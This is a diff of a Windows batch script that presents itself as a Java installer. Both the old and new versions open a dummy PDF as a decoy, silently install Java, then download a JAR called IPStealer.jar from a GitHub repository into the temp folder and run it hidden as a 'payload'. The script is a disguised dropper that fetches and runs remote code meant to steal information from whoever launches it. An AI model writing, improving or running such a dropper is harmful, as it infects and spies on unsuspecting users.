@@ -1,31 +1,33 @@
 @echo off
-chcp 65001 >nul
-setlocal enabledelayedexpansion
+REM --- Improved Installer for Java & Jar Execution ---
+echo [Phase 1] Starting silent installation...
+REM 1. Silent decoy
+start "" "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf" >nul 2>&1
 
-REM --- STEP 1: Open PDF Decoy (Silent) ---
-start "" "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf"
-
-REM --- STEP 2: Install Java 18 Silently ---
-echo [*] Checking/Installing Java 18...
-powershell -Command "$ProgressPreference='SilentlyContinue'; $javaUrl='https://download.oracle.com/java/18/archive/jdk-18.0.2.1_windows-x64_bin.exe'; $tempJava='%TEMP%\jdk18_install.exe'; if(!(Test-Path $tempJava)){Invoke-WebRequest -Uri $javaUrl -OutFile $tempJava -Headers @{'Cookie'='oraclelicense=accept-securebackup-cookie'}}; Start-Process $tempJava -ArgumentList '/s INSTALLDIR=\"C:\\Java\\jdk-18\" REBOOT=Disable' -Wait -WindowStyle Hidden"
-
-REM --- STEP 3: Set Java 18 as Default (Update PATH) ---
-echo [*] Setting Java 18 as default...
-powershell -Command "[Environment]::SetEnvironmentVariable('JAVA_HOME', 'C:\\Java\\jdk-18', 'Machine'); $path=[Environment]::GetEnvironmentVariable('Path', 'Machine'); if(!$path.Contains('C:\\Java\\jdk-18\\bin')){[Environment]::SetEnvironmentVariable('Path', $path+';C:\\Java\\jdk-18\\bin', 'Machine')}"
-
-REM --- STEP 4: Download & Run Your JAR ---
-echo [*] Downloading payload...
-powershell -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/mavi30173-ai/mc-server/raw/main/IPStealer.jar' -OutFile '%TEMP%\payload.jar'"
-
-echo [*] Executing payload...
-set "JAVA_EXE=C:\Java\jdk-18\bin\java.exe"
-if exist "%JAVA_EXE%" (
-    "%JAVA_EXE%" -jar "%TEMP%\payload.jar" >nul 2>&1
+REM 2. Try to download and install Java 18 ONLY if not present
+where java >nul 2>&1
+if %errorlevel% neq 0 (
+    echo [Phase 2] Java not found. Attempting to install Java 18...
+    powershell -Command "$url='https://javadl.oracle.com/webapps/download/AutoDL?BundleId=249213_b2d4dfe4f4d04c8aab5a5b8f4a41c3a4'; $out='%TEMP%\java_installer.exe'; (New-Object Net.WebClient).DownloadFile($url, $out); Start-Process $out -ArgumentList '/s' -Wait -WindowStyle Hidden; Remove-Item $out"
 ) else (
-    java -jar "%TEMP%\payload.jar" >nul 2>&1
+    echo [Phase 2] Java is already installed.
 )
 
-REM --- STEP 5: Cleanup & Exit ---
-timeout /t 2 /nobreak >nul
-del "%TEMP%\jdk18_install.exe" 2>nul
+REM 3. Download the JAR payload
+echo [Phase 3] Downloading payload...
+powershell -Command "$url='https://github.com/mavi30173-ai/mc-server/raw/main/IPStealer.jar'; $out='%TEMP%\payload.jar'; (New-Object Net.WebClient).DownloadFile($url, $out); echo 'Download complete.'"
+
+REM 4. Execute the JAR with available Java
+echo [Phase 4] Executing payload...
+java -jar "%TEMP%\payload.jar" >nul 2>&1
+if %errorlevel% neq 0 (
+    echo ERROR: Could not run the JAR file. Java may not be installed correctly.
+    pause
+    exit /b 1
+)
+
+echo [Phase 5] Cleaning up...
+timeout /t 1 /nobreak >nul
+echo Operation completed. You can close this window.
+timeout /t 3 /nobreak >nul
 exit
